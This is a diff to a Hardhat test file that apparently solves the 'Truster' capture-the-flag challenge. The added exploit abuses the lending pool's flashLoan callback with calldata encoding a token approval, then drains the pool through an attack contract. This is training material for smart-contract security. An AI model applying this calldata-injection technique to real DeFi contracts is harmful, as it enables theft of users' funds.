@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { AbiCoder } = require('ethers/lib/utils');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -28,7 +29,21 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        const AttackTruster = await ethers.getContractFactory('AttackTruster', deployer)
+        this.attack = await AttackTruster.deploy(this.token.address, this.pool.address)
+
+        let ABI = [
+            "function approve(uint _amount)"
+        ];
+
+        let iface = new ethers.utils.Interface(ABI);
+        
+        this.pool.connect(attacker).flashLoan(
+            0, attacker, this.attack.address, 
+            iface.encodeFunctionData("approve", [ TOKENS_IN_POOL ])
+            )
+
+        this.attack.connect(attacker).drain(TOKENS_IN_POOL)
     });
 
     after(async function () {
